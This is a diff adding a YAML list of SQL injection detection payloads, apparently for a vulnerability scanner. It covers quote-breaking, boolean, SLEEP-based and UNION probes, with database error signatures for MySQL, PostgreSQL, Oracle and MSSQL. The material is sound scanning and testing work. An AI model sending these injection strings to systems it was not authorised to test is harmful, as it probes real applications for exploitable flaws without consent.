@@ -1,0 +1,49 @@
+# SQL Injection Detection Payloads
+# These are detection-only, no data extraction
+
+error_based:
+  - "'"
+  - "\""
+  - "'--"
+  - "\"--"
+  - "';"
+  - "\";"
+  - "' OR '1'='1"
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+
+time_based_indicators:
+  - "' AND SLEEP(0)--"  # Control
+  - "' AND SLEEP(5)--"  # Test (we only check if syntax accepts it)
+
+blind_boolean:
+  - "' AND 'a'='a"
+  - "' AND 'a'='b"
+
+union_indicators:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+
+databases:
+  mysql:
+    error_signatures:
+      - "You have an error in your SQL syntax"
+      - "Warning: mysql_"
+      - "MySQL server version"
+  
+  postgresql:
+    error_signatures:
+      - "PostgreSQL.* ERROR"
+      - "ERROR:.*syntax"
+  
+  oracle:
+    error_signatures:
+      - "ORA-00933"
+      - "ORA-01756"
+      - "quoted string not properly terminated"
+  
+  mssql:
+    error_signatures:
+      - "Msg \\d+, Level \\d+, State \\d+"
+      - "Unclosed quotation mark"
